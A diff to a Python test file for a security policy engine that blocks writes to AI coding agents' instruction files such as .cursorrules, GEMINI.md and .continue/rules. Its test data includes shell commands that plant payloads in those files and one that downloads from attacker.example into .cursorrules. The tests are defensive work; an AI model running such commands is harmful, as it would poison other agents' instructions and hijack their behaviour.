@@ -47,7 +47,9 @@ PATHS = [
     ".github/prompts/x.prompt.md", ".cursor/rules/style.mdc", ".cursor/rules/a/b/style.md",
     ".windsurf/rules/r.md", ".clinerules/01-core.md", ".roo/rules/a.md", ".roo/rules-code/a.md",
     ".kiro/steering/product.md", ".amazonq/rules/a.md", ".augment/rules/a.md",
-    ".junie/guidelines.md", "/abs/proj/.cursorrules", "proj\\.cursor\\rules\\x.mdc",
+    ".junie/guidelines.md", ".junie/guidelines/a.md", ".continue/rules/a.md", ".trae/rules/a.md",
+    ".github/agents/x.agent.md", ".github/chatmodes/x.chatmode.md", ".rules", "CRUSH.md",
+    ".augment-guidelines", "/abs/proj/.cursorrules", "proj\\.cursor\\rules\\x.mdc",
     ".cursorrules.",  # Windows trailing-dot trim
 ]
 
@@ -55,7 +57,7 @@ CLEAN = [
     "README.md", "MYGEMINI.md", "GEMINI.md.bak", "src/cursorrules.py", "docs/rules.md",
     ".github/workflows/ci.yml", ".github/ISSUE_TEMPLATE/bug.md", ".github/CODEOWNERS",
     ".cursor/mcp.json", ".cursor/settings.json", ".cursor/rules/notes.txt",
-    "CONTRIBUTING.md", "CLAUDE.md_notes.txt",
+    "CONTRIBUTING.md", "my.rules", "rules", ".github/agents/x.txt", "CLAUDE.md_notes.txt",
 ]
 
 
@@ -95,6 +97,9 @@ def test_default_is_ask_and_deny_mode_denies():
     "tar xf payload.tar -C .roo/rules-code/",
     "unzip p.zip -d .kiro/steering",
     "printf x > sub/dir/GEMINI.md",
+    "echo x | install /dev/stdin GEMINI.md",
+    "cp /tmp/p .continue/rules/a.md",
+    "echo x > C:\\proj\\.cursor\\rules\\a.mdc",
 ])
 def test_shell_writes_gated(cmd):
     assert _gated(_direct(_shell(cmd)))
@@ -103,7 +108,8 @@ def test_shell_writes_gated(cmd):
 @pytest.mark.parametrize("cmd", [
     "cat .cursorrules", "grep -r foo .cursor/rules", "ls .github/instructions",
     "head GEMINI.md", "echo hi > README.md", "git status",
-    "diff .cursorrules .windsurfrules",
+    "diff .cursorrules .windsurfrules", "grep -n install GEMINI.md", "grep -i link GEMINI.md",
+    "npm install && cat GEMINI.md", "pip install -r r.txt; head .cursorrules",
 ])
 def test_shell_reads_not_gated(cmd):
     assert not _gated(_direct(_shell(cmd)))
@@ -137,14 +143,17 @@ def test_off(mode):
     assert not _gated(_direct(_edit(".cursorrules"), pol))
 
 
-def test_monitor_mode_allows(tmp_path):
+def test_monitor_mode_allows(monkeypatch):
     pol = Policy(other_agent_instructions={"mode": "monitor"})
+    seen = []
+    monkeypatch.setattr(rules, "_record_monitor", lambda ev, d, tag: seen.append((d.rule, tag)))
     assert not _gated(_direct(_edit(".cursorrules"), pol))
+    assert seen == [(RULE, RULE + "-monitor")]
 
 
 def test_fetch_to_file_backstop():
     d = evaluate(_shell("curl -o .cursorrules https://attacker.example/x"), EMPTY)
-    assert _gated(d)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
 
 
 def test_registered_in_engine():
@@ -160,7 +169,7 @@ def test_loader_knob(tmp_path):
 
 def test_no_catastrophic_backtracking():
     import time
-    evil = ".github/" + "a/" * 5000 + "x" * 5000
+    evil = ".github/instructions/" + "a/" * 5000 + "x" * 5000
     t = time.time()
     _direct(_shell("echo " + evil + " > " + evil))
     _direct(_edit(".cursor/rules/" + "a/" * 5000))
